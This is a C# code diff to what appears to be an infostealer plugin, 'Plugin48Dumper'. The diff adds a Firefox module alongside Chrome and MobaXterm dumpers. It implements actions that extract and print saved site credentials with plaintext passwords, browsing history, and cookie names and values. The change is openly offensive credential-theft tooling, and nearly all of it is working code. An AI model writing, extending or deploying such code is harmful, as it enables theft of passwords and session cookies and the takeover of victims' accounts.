@@ -24,6 +24,7 @@ namespace Plugin48Dumper
         private List<clsDumper> m_lsModule = new List<clsDumper>()
         {
             new clsChromeDumper(),
+            new clsFirefoxDumper(),
             new clsMobaXtermDumper(),
         };
         private Dictionary<string, clsDumper> m_dicModule = new Dictionary<string, clsDumper>();
@@ -184,14 +185,65 @@ namespace Plugin48Dumper
                 }
                 else if (szTarget == "firefox")
                 {
-                    var module = (clsChromeDumper)m_dicModule[szTarget];
+                    var module = (clsFirefoxDumper)m_dicModule[szTarget];
                     string szAction = lsKey[2];
 
                     clsTools.fnLogInfo("Action => " + szAction);
 
                     if (szAction == "cred")
                     {
+                        var ls = module.fnDumpCredential(nCount, szRegex);
+                        foreach (var cred in ls)
+                        {
+                            clsTools.fnLogOK(new string('=', 50));
 
+                            clsTools.fnLogOK("[URL]: " + cred.Url);
+                            clsTools.fnLogOK("[Username]: " + cred.Username);
+                            clsTools.fnLogOK("[Password]: " + cred.Password);
+                            clsTools.fnLogOK("[Creation Date]: " + cred.Create_Date);
+                            clsTools.fnLogOK("[Last Used]: " + cred.Last_Used_Date);
+                        }
+
+                        clsTools.fnLogOK(new string('=', 50));
+                        clsTools.fnLogOK("[Summary]");
+                        clsTools.fnLogOK($"Total: {ls.Count} records");
+                    }
+                    else if (szAction == "history")
+                    {
+                        var ls = module.fnDumpHistory(nCount, szRegex);
+                        foreach (var history in ls)
+                        {
+                            clsTools.fnLogOK(new string('=', 50));
+
+                            clsTools.fnLogOK($"[Title]: {history.szTitle}");
+                            clsTools.fnLogOK($"[URL]: {history.szURL}");
+                            clsTools.fnLogOK($"[Last Used]: {history.szLastUsed}");
+                        }
+
+                        clsTools.fnLogOK(new string('=', 50));
+                        clsTools.fnLogOK("[Summary]");
+                        clsTools.fnLogOK($"Total: {ls.Count} records");
+                    }
+                    else if (szAction == "cookie")
+                    {
+                        var ls = module.fnDumpCookie(nCount, szRegex);
+                        foreach (var cookie in ls)
+                        {
+                            clsTools.fnLogOK(new string('=', 50));
+
+                            clsTools.fnLogOK($"[Host]: {cookie.szHost}");
+                            clsTools.fnLogOK($"[Name]: {cookie.szName}");
+                            clsTools.fnLogOK($"[Value]: {cookie.szValue}");
+
+                            clsTools.fnLogOK($"[Value]: {cookie.szExpiry}");
+                            clsTools.fnLogOK($"[Value]: {cookie.szCreation}");
+                            clsTools.fnLogOK($"[Value]: {cookie.szLastAccessed}");
+                            clsTools.fnLogOK($"[Value]: {cookie.szUpdated}");
+                        }
+
+                        clsTools.fnLogOK(new string('=', 50));
+                        clsTools.fnLogOK("[Summary]");
+                        clsTools.fnLogOK($"Total: {ls.Count} records");
                     }
                 }
                 else if (szTarget == "xterm")
